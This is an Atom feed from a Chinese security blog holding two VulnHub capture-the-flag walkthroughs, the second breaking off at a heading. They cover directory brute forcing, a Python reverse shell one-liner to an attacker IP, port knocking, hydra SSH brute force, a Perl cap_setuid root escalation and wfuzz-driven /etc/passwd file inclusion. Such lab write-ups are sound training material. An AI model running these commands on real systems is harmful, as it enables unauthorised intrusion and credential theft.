<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://www.n1h1l157.live</id>
    <title>X_T • Posts by &#34;vulnhub 31-40&#34; tag</title>
    <link href="http://www.n1h1l157.live" />
    <updated>2021-10-31T16:00:00.000Z</updated>
    <category term="渗透测试" />
    <category term="Linux" />
    <category term="记忆" />
    <category term="信息安全网址" />
    <category term="VULNHUB 1-10" />
    <category term="Trojan" />
    <category term="VULNHUB 11-20" />
    <category term="VULNHUB 21-30" />
    <category term="VULNHUB 31-40" />
    <category term="VULNHUB 41-50" />
    <category term="ENFJ" />
    <category term="ENTJ" />
    <category term="ESFJ" />
    <category term="ENFP" />
    <category term="ESTJ" />
    <category term="ENTP" />
    <category term="ESFP" />
    <category term="ESTP" />
    <category term="INFJ" />
    <category term="INTJ" />
    <category term="INTP" />
    <category term="INFP" />
    <category term="ISFJ" />
    <category term="ISFP" />
    <category term="ISTJ" />
    <category term="ISTP" />
    <category term="MBTI" />
    <category term="心理测试" />
    <category term="生命" />
    <category term="人生" />
    <category term="命运" />
    <category term="人生哲学" />
    <category term="成长" />
    <category term="神学" />
    <category term="社会" />
    <category term="意义" />
    <category term="爱情" />
    <category term="历史" />
    <category term="人性" />
    <category term="道德" />
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/</id>
        <title>VULNHUB 31 PROXIMACENTAURI</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tcHJveGltYWNlbnRhdXJpLDcwOS8=&#34;&gt;https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDM0NzYyL2FydGljbGUvZGV0YWlscy8xMTg2NjM1NTE=&#34;&gt;https://blog.csdn.net/qq_45434762/article/details/118663551&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 PROXIMACENTAURI：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-786.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.5&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-787.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNQ==&#34;&gt;http://192.168.31.5&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-788.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;目录扫描:  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-789.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到很多目录，暂时不知道哪个目录比较敏感，需要依次访问&lt;/p&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzLw==&#34;&gt;http://192.168.31.5/docs/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-790.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到一个 php 后缀的文件，点开看看:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kb2NzL3VwZGF0YS5waHA=&#34;&gt;http://192.168.31.5/docs/updata.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-791.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-792.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9pbWFnZXMv&#34;&gt;http://192.168.31.5/images/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-793.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9sb2dpbi5waHA=&#34;&gt;http://192.168.31.5/login.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-794.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到一个后台的登陆地址，并且该 web 是有 pluck 4.7.13 写出来的&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy8=&#34;&gt;http://192.168.31.5/files/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-795.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9hZG1pbi5waHA=&#34;&gt;http://192.168.31.5/admin.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-796.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;管理员的后台地址，会自动跳转到 login 界面&lt;/p&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yb2JvdHMudHh0&#34;&gt;http://192.168.31.5/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-797.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9wbGFuZXQv&#34;&gt;http://192.168.31.5/planet/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-798.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQv&#34;&gt;http://192.168.31.5/files/planet/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-799.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9maWxlcy9wbGFuZXQuaHRtbA==&#34;&gt;http://192.168.31.5/files/planet.html&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-800.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9yZXF1aXJlbWVudHMucGhw&#34;&gt;http://192.168.31.5/requirements.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-801.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找不到更多的线索了，根据已有的进行总结，发现只有一个 pluck 4.7.13 的信息，和一个后台的登陆地址可以利用&lt;/p&gt;
&lt;h3 id=&#34;pluck-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pluck-漏洞利用&#34;&gt;#&lt;/a&gt; pluck 漏洞利用&lt;/h3&gt;
&lt;p&gt;用 searchsploit 搜索寻 pluck 对应版本漏洞，发现存在一个授权才能访问的 RCE 漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-802.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;确认 payload 的位置，将其复制到自己的目录下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-803.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-804.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;阅读此 py 文件，根据脚本中的内容，带参数执行脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-805.png&#34; width=&#34;220&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;由于此漏洞只适应于 pluck 的授权 RCE，此处如果不能破解出来其账户和密码，显然无法使用，经尝试并不是弱口令，放弃这个目标，继续信息搜集&lt;/p&gt;
&lt;h3 id=&#34;dirb-扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dirb-扩大信息面&#34;&gt;#&lt;/a&gt; dirb 扩大信息面&lt;/h3&gt;
&lt;p&gt;dirb 的优点在于搜集到一级目录后，还会继续尝试二级目录的识别&lt;/p&gt;
&lt;p&gt;用 dirb 收集更多的字目录信息: &lt;code&gt;dirb 192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-806.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;依次去打开这些二级目录，发现了一个敏感的地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoLw==&#34;&gt;http://192.168.31.5/data/trash/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-807.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;继续向下深入，看三级目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNS9kYXRhL3RyYXNoL2ZpbGVzL3NoZWxsLnBoYXI=&#34;&gt;http://192.168.31.5/data/trash/files/shell.phar&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;最终在此路径下找到了一个 shell.phar 的文件，此命名就比较敏感&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-808.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 访问此目录，是一个 webshell，现在拿到了网站权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-809.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在网站上执行命令有诸多不便，需要将其反弹到终端上&lt;/p&gt;
&lt;p&gt;检测到服务器没有 nc，有一个 python3 ，就用 python3 来反弹 shell&lt;br&gt;
 &lt;code&gt;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.31.75 &amp;quot;,444 4 ));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-810.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;设置 stty 的格式，输出为一个比较美观的终端&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-811.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;端口敲门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口敲门&#34;&gt;#&lt;/a&gt; 端口敲门&lt;/h3&gt;
&lt;p&gt;敲门（knock）指的是我们从自己的客户端设备（pc、笔记本或者手机）向服务器 IP 发送一系列实现约好的暗号，而服务器上需要相应的安装接收暗号的服务 knockd，它在接收到正确的暗号的时候，会临时性的为敲门者开一段时间的门并随后关上（当然也能够配置成一直开着），我们要在这几秒钟里面登录成功并且保持连接，如果不小心断了连接就要重新敲门。&lt;/p&gt;
&lt;p&gt;拿到服务器的权限之后，去看了一些敏感文件，敏感权限之后都没有任何问题，筛选端口的时候发现 knock 命令&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-812.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 knock 的配置文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-813.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 root 账户的端口敲门的配置问题，依次去敲击 14,29,43 端口可以将防火墙规则调整为开放，依次去敲击 62,40,46 端口可以将防火墙规则调整为关闭，注意有一个两个端口之间的间隔时间不能大于 15 ms&lt;/p&gt;
&lt;p&gt;依次按顺序敲击这三个端口 &lt;code&gt;sudo nmap -p 14,29,43 192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-814.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;敲击端口前，是 22 是被过滤的，端口敲门之后并没有立即将端口轰开，反而是等待了一段时间之后才将 22 端口打开，现在 22 已经打开，可以通过 ssh 去连接这台服务器了，但是我们并没有 root 账户的密码，怎么去连接呢。&lt;/p&gt;
&lt;p&gt;先直接去做，看能不能有什么收获 &lt;code&gt;ssh root@192.168.31.5&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-815.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;看到了一个 github 地址，点开进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-816.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现是一系列密码并且提示用 proxima、centauri 进行爆破，将字典加载到本地，准备用 hydra 爆破一波&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-817.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看到服务器上存在的用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-818.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;服务器存在 proxima、centauri 用户，将这两个名字写到 user.txt 中，用 hydra 进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-819.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;hydra -L user.txt -P passwd.txt ssh://192.168.31.5 -t 4 -I -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-820.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;很遗憾，爆破失败，继续往下做，在实际测试中，经常有爆破失败的情况，我们需要从更多的角度去收集服务器的信息，经过检查，发现服务器上存在 mysql 的备份文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-821.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 备份文件中就有用户名和密码，alfauser:passw0rd&lt;/p&gt;
&lt;h3 id=&#34;数据库信息泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#数据库信息泄露&#34;&gt;#&lt;/a&gt; 数据库信息泄露&lt;/h3&gt;
&lt;p&gt;登陆数据库，查询敏感账户和密码： &lt;code&gt;mysql -u alfauser -p&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-822.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;连接成功，搜索敏感文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-823.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一翻搜索后，在数据库中找到了 proxima 账户和其密码，切换账户至 proxima 账户，成功拿到其 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-824.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;cap_setuid-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cap_setuid-提权&#34;&gt;#&lt;/a&gt; cap_setuid 提权&lt;/h3&gt;
&lt;p&gt;接下来要想办法提权至 root，直接上监控 linpeas 看有什么可疑的文件&lt;br&gt;
 &lt;code&gt;wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-825.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行 linpeas 进行检测&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-826.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;使用 linpeas 之后监测到一个权限设置错误的命令 perl&lt;/p&gt;
&lt;p&gt;Capabilities 是 linux 的一种访问控制能力，能够更精细化的将操作系统权限（网络，文件等）赋权给应用程序，其中就包括设置 uid 和 gid 的权限。因此具备 cap_setuid 和 cap_setgid 权限的程序可以用来进行权限提升。&lt;/p&gt;
&lt;p&gt;提权利用命令在 gtfobins 上可以找到更多：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGVybC8=&#34;&gt;https://gtfobins.github.io/gtfobins/perl/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-827.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看官方介绍，也就是为了细分 root 权限的 capabilities，但是也会因为设置错误导致权限提升&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &amp;quot;/bin/sh&amp;quot;;&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-828.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
</content>
        <category term="VULNHUB 31-40" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/133%20GROTESQUE3/</id>
        <title>VULNHUB 33 GROTESQUE3</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/133%20GROTESQUE3/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZ3JvdGVzcXVlLTMwMSw3MjMv&#34;&gt;https://www.vulnhub.com/entry/grotesque-301,723/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 GROTESQUE3：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; ; rm -f 1.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-866.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.63&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.63&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-867.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-868.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这里有一个地址，点击这个地址会跳转到一个页面&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjMvYXRsYXNnLmpwZw==&#34;&gt;http://192.168.31.63/atlasg.jpg&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-869.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示指向了这个图片，看来这个图片有一些线索，仔细查看这个图片&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-870.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;图片中的一部分有这么一张小图片，有 MD 还有 5 个 X，很显然是 md5&lt;br&gt;
 那么这个 md5 加密有什么可以利用的地方吗？可能会是目录采用的 md5 加密，可能是某个特殊的文件地址的前缀是 md5 的字符串&lt;/p&gt;
&lt;h3 id=&#34;linux-下-md5-加密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux-下-md5-加密&#34;&gt;#&lt;/a&gt; linux 下 md5 加密&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;终端里边进行 md5 加密和解密分别为如下操作&lt;br&gt;
 echo “xxx” | md5sum&lt;br&gt;
John 1.txt –format=Raw-MD5 –wordlist=/usr/share/wordlists/dirbuster/directory –fork =2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-871.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;抓取网站的数据包，通过 burp 代理浏览器数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-872.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;设置攻击类型为 Cluster bomb，即两个字段采用两个不同的字典，第一个字段填一个比较常用的爆破字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-873.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第二个字典填一个经常用的后缀，如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-874.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且采用 md5 加密对自己的 payload 进行加密&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-875.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;注意要对第一个字段 md5 加密，第二个字段不加密，按此方法爆破即可&lt;/p&gt;
&lt;p&gt;还有另外一种爆破方式，是通过 linux 命令生成批量的 md5 加密的字典&lt;br&gt;
 &lt;code&gt;for i in $(cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt); do echo $i;echo $i | md5sum &amp;gt;&amp;gt; dirscroty_md5.txt; done&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-876.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;生成的字典显示如下，每一行的最后面都有一个横线&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-877.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;利用vim自定义txt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用vim自定义txt&#34;&gt;#&lt;/a&gt; 利用 vim 自定义 txt&lt;/h3&gt;
&lt;p&gt;输入:% s#-##g 即可以批量清除横线&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-878.png&#34; width=&#34;270&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;此时的字典已经显示为正常，可用此 md5 加密字典进行爆破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-879.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;爆破-md5-目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#爆破-md5-目录&#34;&gt;#&lt;/a&gt; 爆破 md5 目录&lt;/h3&gt;
&lt;p&gt;用 gobuster 加载此字典进行目录的搜集&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,bak,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium-md5.txt -u http://192.168.31.63/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-880.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个敏感的地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjQyL2Y2NmIyMmJmMDIwMzM0YjA0YzdkMGQzZWI1MDEwMzkxLnBocA==&#34;&gt;http://192.168.31.242/f66b22bf020334b04c7d0d3eb5010391.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-881.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看来是有一些参数在这个 url 地址后边&lt;/p&gt;
&lt;h3 id=&#34;wfuzz爆破http参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz爆破http参数&#34;&gt;#&lt;/a&gt; wfuzz 爆破 http 参数&lt;/h3&gt;
&lt;p&gt;用 wfuzz 爆破 http 参数&lt;br&gt;
 &lt;code&gt;wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &amp;quot;http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?FUZZ=/etc/passwd&amp;quot; -c --hh 0 -t 32 --hc 404,403&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-882.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到了一个 pupose 时返回 200 的代码，打开目录&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjMvZjY2YjIyYmYwMjAzMzRiMDRjN2QwZDNlYjUwMTAzOTEucGhwP3B1cnBvc2U9L2V0Yy9wYXNzd2Q=&#34;&gt;http://192.168.31.63/f66b22bf020334b04c7d0d3eb5010391.php?purpose=/etc/passwd&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-883.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了敏感文件泄漏，检查源代码可以看到格式比较标准的文件，&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-884.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现存在 freddie 和 root 两个用户&lt;/p&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
